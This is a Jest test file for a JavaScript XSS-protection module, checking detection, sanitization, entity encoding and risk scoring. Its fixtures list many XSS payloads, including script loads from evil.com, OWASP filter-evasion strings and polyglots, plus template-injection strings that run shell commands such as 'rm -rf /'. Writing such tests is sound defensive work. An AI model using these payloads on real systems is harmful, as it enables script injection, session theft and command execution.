// XSS Protection Tests - Comprehensive testing for Cross-Site Scripting vulnerabilities
const { scanForXSS, sanitizeInput, encodeHTMLEntities, createSafeHTML } = require('../../src/utils/xssProtection');

describe('🛡️ XSS Protection Tests', () => {
  describe('Basic XSS Detection', () => {
    test('should detect script tag injections', () => {
      const scriptAttacks = [
        '<script>alert("XSS")</script>',
        '<script src="http://evil.com/xss.js"></script>',
        '<script>document.cookie="stolen"</script>',
        '<script>window.location="http://attacker.com"</script>',
        '<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
        '<script>eval(atob("YWxlcnQoJ1hTUycpOw=="))</script>'
      ];

      scriptAttacks.forEach(attack => {
        const result = scanForXSS(attack, { ip: '127.0.0.1' }, 'script_test', 'html');
        
        expect(result.safe).toBe(false);
        expect(result.threats.some(threat => 
          ['XSS_PATTERN_MATCH', 'DANGEROUS_HTML_TAG'].includes(threat.type)
        )).toBe(true);
        expect(result.severity).toMatch(/^(critical|high)$/);
      });
    });

    test('should detect event handler injections', () => {
      const eventAttacks = [
        '<img src="x" onerror="alert(\'XSS\')">',
        '<body onload="alert(\'XSS\')">',
        '<div onclick="malicious()">Click me</div>',
        '<input type="text" onfocus="alert(document.cookie)">',
        '<svg onload="alert(1)">',
        '<iframe onload="evil_function()"></iframe>',
        '<button onmouseover="steal_data()">Hover</button>'
      ];

      eventAttacks.forEach(attack => {
        const result = scanForXSS(attack, { ip: '127.0.0.1' }, 'event_test', 'html');
        
        expect(result.safe).toBe(false);
        expect(result.threats.some(threat => 
          threat.type === 'DANGEROUS_ATTRIBUTE'
        )).toBe(true);
      });
    });

    test('should detect javascript: URL injections', () => {
      const urlAttacks = [
        '<a href="javascript:alert(\'XSS\')">Click</a>',
        '<iframe src="javascript:alert(document.domain)"></iframe>',
        '<form action="javascript:malicious()">',
        '<img src="javascript:alert(\'XSS\')">',
        '<link href="javascript:void(0)" rel="stylesheet">',
        'javascript:eval(atob("YWxlcnQoMSk="))'
      ];

      urlAttacks.forEach(attack => {
        const result = scanForXSS(attack, { ip: '127.0.0.1' }, 'url_test', 'html');
        
        expect(result.safe).toBe(false);
        expect(result.threats.some(threat => 
          threat.type === 'XSS_PATTERN_MATCH'
        )).toBe(true);
      });
    });

    test('should allow safe HTML content', () => {
      const safeContent = [
        '<p>This is safe content</p>',
        '<div class="container">Safe text</div>',
        '<h1>Page Title</h1>',
        '<ul><li>Safe list item</li></ul>',
        '<a href="https://example.com">Safe link</a>',
        '<img src="/safe/image.jpg" alt="Safe image">',
        'Plain text without any HTML',
        '<strong>Bold text</strong> and <em>italic text</em>'
      ];

      safeContent.forEach(content => {
        const result = scanForXSS(content, { ip: '127.0.0.1' }, 'safe_test', 'html');
        
        expect(result.safe).toBe(true);
        expect(result.threats).toHaveLength(0);
        expect(result.severity).toBe('none');
      });
    });
  });

  describe('Advanced XSS Detection', () => {
    test('should detect obfuscated XSS attempts', () => {
      const obfuscatedAttacks = [
        // HTML entity encoding
        '&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;',
        // URL encoding
        '%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E',
        // Unicode encoding
        '<scr\\u0069pt>alert(\\u0027XSS\\u0027)</scr\\u0069pt>',
        // Hex encoding
        '\\x3Cscript\\x3Ealert(\\x27XSS\\x27)\\x3C/script\\x3E',
        // Mixed case
        '<ScRiPt>ALeRt("XSS")</ScRiPt>',
        // Tab/newline insertion
        '<script\n>alert("XSS")</script>',
        // Comment insertion
        '<scr<!--comment-->ipt>alert("XSS")</script>'
      ];

      obfuscatedAttacks.forEach(attack => {
        const result = scanForXSS(attack, { ip: '127.0.0.1' }, 'obfuscated_test', 'html');
        
        // Should detect either original or decoded version
        expect(result.safe).toBe(false);
        expect(result.threats.length).toBeGreaterThan(0);
      });
    });

    test('should detect CSS-based XSS attacks', () => {
      const cssAttacks = [
        '<style>body{background:url("javascript:alert(\'XSS\')")}</style>',
        '<div style="background:expression(alert(\'XSS\'))">',
        '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
        '<style>@import"javascript:alert(\'XSS\')"</style>',
        '<div style="behavior:url(xss.htc)">',
        '<style>body{-moz-binding:url("http://evil.com/xss.xml#xss")}</style>'
      ];

      cssAttacks.forEach(attack => {
        const result = scanForXSS(attack, { ip: '127.0.0.1' }, 'css_test', 'css');
        
        expect(result.safe).toBe(false);
        expect(result.threats.some(threat => 
          ['XSS_PATTERN_MATCH', 'CONTEXT_XSS_CSS'].includes(threat.type)
        )).toBe(true);
      });
    });

    test('should detect template injection patterns', () => {
      const templateAttacks = [
        '{{constructor.constructor("alert(1)")()}}',
        '${alert(document.domain)}',
        '<%=system("rm -rf /")%>',
        '{%set x=request.application.__globals__.__builtins__.__import__("os").system("ls")%}',
        '{{7*7}}',
        '{{config.items()}}',
        '{{request.environ}}',
        '${java.lang.Runtime.getRuntime().exec("whoami")}'
      ];

      templateAttacks.forEach(attack => {
        const result = scanForXSS(attack, { ip: '127.0.0.1' }, 'template_test', 'html');
        
        expect(result.safe).toBe(false);
        expect(result.threats.length).toBeGreaterThan(0);
      });
    });
  });

  describe('Context-Specific Validation', () => {
    test('should validate HTML content context', () => {
      const htmlContextAttacks = [
        '<script>alert("XSS")</script>',
        '<style>body{background:url("javascript:alert(1)")}</style>',
        '<img onerror="alert(1)" src="x">'
      ];

      htmlContextAttacks.forEach(attack => {
        const result = scanForXSS(attack, { ip: '127.0.0.1' }, 'html_context_test', 'html');
        
        expect(result.safe).toBe(false);
        expect(result.threats.some(threat => 
          threat.context === 'html'
        )).toBe(true);
      });
    });

    test('should validate attribute context', () => {
      const attributeAttacks = [
        'javascript:alert(1)',
        'vbscript:msgbox("XSS")',
        'expression(alert("XSS"))'
      ];

      attributeAttacks.forEach(attack => {
        const result = scanForXSS(attack, { ip: '127.0.0.1' }, 'attr_test', 'attribute');
        
        expect(result.safe).toBe(false);
        expect(result.threats.some(threat => 
          threat.context === 'attribute'
        )).toBe(true);
      });
    });

    test('should validate CSS context', () => {
      const cssAttacks = [
        'expression(alert("XSS"))',
        'javascript:alert(1)',
        '@import "evil.css"',
        'url("javascript:alert(1)")'
      ];

      cssAttacks.forEach(attack => {
        const result = scanForXSS(attack, { ip: '127.0.0.1' }, 'css_context_test', 'css');
        
        expect(result.safe).toBe(false);
        expect(result.threats.some(threat => 
          threat.context === 'css'
        )).toBe(true);
      });
    });
  });

  describe('Input Sanitization', () => {
    test('should sanitize dangerous HTML tags', () => {
      const dangerousInputs = [
        {
          input: '<script>alert("XSS")</script>',
          shouldRemove: ['script']
        },
        {
          input: '<iframe src="evil.com"></iframe>',
          shouldRemove: ['iframe']
        },
        {
          input: '<object data="evil.swf"></object>',
          shouldRemove: ['object']
        },
        {
          input: '<embed src="evil.swf">',
          shouldRemove: ['embed']
        }
      ];

      dangerousInputs.forEach(({ input, shouldRemove }) => {
        const sanitized = sanitizeInput(input, { stripTags: true });
        
        shouldRemove.forEach(tag => {
          expect(sanitized).not.toContain(`<${tag}`);
          expect(sanitized).not.toContain(`</${tag}>`);
        });
      });
    });

    test('should sanitize dangerous attributes', () => {
      const dangerousInputs = [
        '<img src="x" onerror="alert(1)">',
        '<div onclick="malicious()">',
        '<button onmouseover="steal()">',
        '<input onfocus="evil()">'
      ];

      dangerousInputs.forEach(input => {
        const sanitized = sanitizeInput(input, { stripAttributes: true });
        
        expect(sanitized).not.toMatch(/on\w+\s*=/);
      });
    });

    test('should encode HTML entities properly', () => {
      const testCases = [
        { input: '<script>', expected: '&lt;script&gt;' },
        { input: '"quoted"', expected: '&quot;quoted&quot;' },
        { input: "it's test", expected: 'it&#x27;s test' },
        { input: 'a & b', expected: 'a &amp; b' },
        { input: 'path/to/file', expected: 'path&#x2F;to&#x2F;file' },
        { input: '`backtick`', expected: '&#x60;backtick&#x60;' },
        { input: 'equal=sign', expected: 'equal&#x3D;sign' }
      ];

      testCases.forEach(({ input, expected }) => {
        const encoded = encodeHTMLEntities(input);
        expect(encoded).toBe(expected);
      });
    });

    test('should preserve safe content during sanitization', () => {
      const safeInputs = [
        '<p>Safe paragraph</p>',
        '<div class="safe">Content</div>',
        '<h1>Title</h1>',
        '<ul><li>List item</li></ul>',
        '<strong>Bold</strong> and <em>italic</em>'
      ];

      safeInputs.forEach(input => {
        const sanitized = sanitizeInput(input, { 
          stripTags: false,
          stripAttributes: false,
          removeScripts: true
        });
        
        // Should preserve safe HTML structure
        expect(sanitized.length).toBeGreaterThan(0);
        expect(sanitized).not.toContain('script');
        expect(sanitized).not.toContain('javascript:');
      });
    });
  });

  describe('Safe HTML Creation', () => {
    test('should create safe HTML from user input', () => {
      const userInputs = [
        {
          input: 'This is <strong>bold</strong> text',
          allowedTags: ['strong', 'em', 'p'],
          expected: 'This is <strong>bold</strong> text'
        },
        {
          input: '<script>alert("XSS")</script><p>Safe content</p>',
          allowedTags: ['p'],
          shouldNotContain: ['script', 'alert']
        },
        {
          input: '<div onclick="evil()">Click me</div>',
          allowedTags: ['div'],
          allowedAttributes: [],
          shouldNotContain: ['onclick']
        }
      ];

      userInputs.forEach(({ input, allowedTags, allowedAttributes, expected, shouldNotContain }) => {
        const safeHtml = createSafeHTML(input, { allowedTags, allowedAttributes });
        
        if (expected) {
          expect(safeHtml).toBe(expected);
        }
        
        if (shouldNotContain) {
          shouldNotContain.forEach(forbidden => {
            expect(safeHtml).not.toContain(forbidden);
          });
        }
      });
    });

    test('should handle complex nested structures safely', () => {
      const complexInput = `
        <div class="article">
          <h2>Article Title</h2>
          <p>This is a <strong>bold</strong> paragraph with <em>italic</em> text.</p>
          <script>alert("This should be removed")</script>
          <ul>
            <li>Item 1</li>
            <li onclick="evil()">Item 2 with dangerous attribute</li>
          </ul>
          <img src="image.jpg" onerror="alert('XSS')" alt="Safe alt text">
        </div>
      `;

      const safeHtml = createSafeHTML(complexInput, {
        allowedTags: ['div', 'h2', 'p', 'strong', 'em', 'ul', 'li', 'img'],
        allowedAttributes: ['class', 'src', 'alt']
      });

      expect(safeHtml).not.toContain('script');
      expect(safeHtml).not.toContain('onclick');
      expect(safeHtml).not.toContain('onerror');
      expect(safeHtml).not.toContain('alert');
      expect(safeHtml).toContain('Article Title');
      expect(safeHtml).toContain('<strong>bold</strong>');
    });
  });

  describe('Risk Assessment', () => {
    test('should calculate accurate risk scores', () => {
      const riskTestCases = [
        {
          input: '<script>document.write(document.cookie)</script>',
          expectedMinScore: 80
        },
        {
          input: '<img src="x" onerror="alert(1)">',
          expectedMinScore: 50
        },
        {
          input: 'safe text content',
          expectedMaxScore: 0
        },
        {
          input: '<strong>bold text</strong>',
          expectedMaxScore: 10
        }
      ];

      riskTestCases.forEach(({ input, expectedMinScore, expectedMaxScore }) => {
        const result = scanForXSS(input, { ip: '127.0.0.1' }, 'risk_test', 'html');
        
        if (expectedMinScore) {
          expect(result.riskScore).toBeGreaterThanOrEqual(expectedMinScore);
        }
        if (expectedMaxScore !== undefined) {
          expect(result.riskScore).toBeLessThanOrEqual(expectedMaxScore);
        }
      });
    });

    test('should categorize threat severity correctly', () => {
      const severityTests = [
        {
          input: '<script>eval(atob("malicious_code"))</script>',
          expectedSeverity: 'critical'
        },
        {
          input: '<img onerror="alert(1)" src="x">',
          expectedSeverity: 'high'
        },
        {
          input: '<div onclick="console.log(1)">',
          expectedSeverity: /^(high|medium)$/
        },
        {
          input: '<strong>safe content</strong>',
          expectedSeverity: 'none'
        }
      ];

      severityTests.forEach(({ input, expectedSeverity }) => {
        const result = scanForXSS(input, { ip: '127.0.0.1' }, 'severity_test', 'html');
        
        if (typeof expectedSeverity === 'string') {
          expect(result.severity).toBe(expectedSeverity);
        } else {
          expect(result.severity).toMatch(expectedSeverity);
        }
      });
    });
  });

  describe('Performance Testing', () => {
    test('should handle large payloads efficiently', () => {
      const largePayload = '<div>' + 'safe content '.repeat(1000) + '<script>alert("XSS")</script></div>';
      
      const startTime = Date.now();
      const result = scanForXSS(largePayload, { ip: '127.0.0.1' }, 'performance_test', 'html');
      const endTime = Date.now();
      
      expect(endTime - startTime).toBeLessThan(1000); // Should complete within 1 second
      expect(result.safe).toBe(false);
    });

    test('should handle multiple concurrent scans', async () => {
      const inputs = [
        '<script>alert("XSS1")</script>',
        '<img onerror="alert(2)" src="x">',
        'safe content',
        '<div onclick="evil()">click</div>',
        '<p>normal paragraph</p>'
      ];

      const promises = inputs.map(input => 
        Promise.resolve(scanForXSS(input, { ip: '127.0.0.1' }, 'concurrent_test', 'html'))
      );

      const results = await Promise.all(promises);
      
      expect(results).toHaveLength(inputs.length);
      results.forEach(result => {
        expect(result).toHaveProperty('safe');
        expect(result).toHaveProperty('threats');
      });
    });
  });

  describe('Error Handling', () => {
    test('should handle invalid inputs gracefully', () => {
      const invalidInputs = [null, undefined, {}, [], 123, true];

      invalidInputs.forEach(input => {
        const result = scanForXSS(input, { ip: '127.0.0.1' }, 'error_test', 'html');
        
        expect(result).toHaveProperty('safe');
        expect(result).toHaveProperty('threats');
        expect(Array.isArray(result.threats)).toBe(true);
      });
    });

    test('should handle malformed HTML gracefully', () => {
      const malformedHTML = [
        '<div><p>unclosed tags',
        '<script><script>nested scripts</script>',
        '<div class="unclosed quote>content</div>',
        '<<<>>><invalid>tags',
        '<div>content with\x00null\x01bytes</div>'
      ];

      malformedHTML.forEach(html => {
        const result = scanForXSS(html, { ip: '127.0.0.1' }, 'malformed_test', 'html');
        
        expect(result).toHaveProperty('safe');
        expect(result).toHaveProperty('threats');
      });
    });
  });

  describe('Real-World Attack Patterns', () => {
    test('should detect actual XSS payloads from penetration tests', () => {
      const realWorldPayloads = [
        // OWASP XSS Filter Evasion
        '<IMG SRC=javascript:alert("XSS")>',
        '<IMG SRC=JaVaScRiPt:alert("XSS")>',
        '<IMG SRC=`javascript:alert("RSnake says, "XSS")`>',
        // Event handler variations
        '<BODY ONLOAD=alert("XSS")>',
        '<BGSOUND SRC="javascript:alert("XSS");">',
        '<BR SIZE="&{alert("XSS")}">',
        // CSS-based attacks
        '<LINK REL="stylesheet" HREF="javascript:alert("XSS");">',
        '<STYLE>@im\\port"\\ja\\vasc\\ript:alert("XSS")";</STYLE>',
        // SVG-based attacks
        '<svg onload=alert(1)>',
        '<svg><script>alert("XSS")</script></svg>',
        // Data URI attacks
        '<IFRAME SRC="data:text/html,<script>alert("XSS")</script>"></IFRAME>'
      ];

      realWorldPayloads.forEach(payload => {
        const result = scanForXSS(payload, { 
          ip: '10.0.0.1', 
          userAgent: 'penetration-test',
          requestPath: '/test'
        }, 'real_world_test', 'html');
        
        expect(result.safe).toBe(false);
        expect(result.riskScore).toBeGreaterThan(50);
        expect(result.severity).toMatch(/^(critical|high)$/);
      });
    });

    test('should handle polyglot XSS payloads', () => {
      const polyglotPayloads = [
        // Works in multiple contexts
        'javascript:/*--></title></style></textarea></script></xmp><svg/onload="+/"/+/onmouseover=1/+/[*/[]/+alert(1)///">',
        // HTML/CSS/JS polyglot
        '/*<script>*/alert("XSS")/*</script>*/',
        // Works as attribute value and HTML content
        '"><script>alert("XSS")</script><"',
        // Works in CSS and HTML
        'expression(alert("XSS"));/*</style><script>alert("XSS")</script>*/'
      ];

      polyglotPayloads.forEach(payload => {
        const htmlResult = scanForXSS(payload, { ip: '127.0.0.1' }, 'polyglot_html', 'html');
        const cssResult = scanForXSS(payload, { ip: '127.0.0.1' }, 'polyglot_css', 'css');
        const attrResult = scanForXSS(payload, { ip: '127.0.0.1' }, 'polyglot_attr', 'attribute');
        
        // Should be detected in at least one context
        const anyUnsafe = !htmlResult.safe || !cssResult.safe || !attrResult.safe;
        expect(anyUnsafe).toBe(true);
      });
    });
  });
});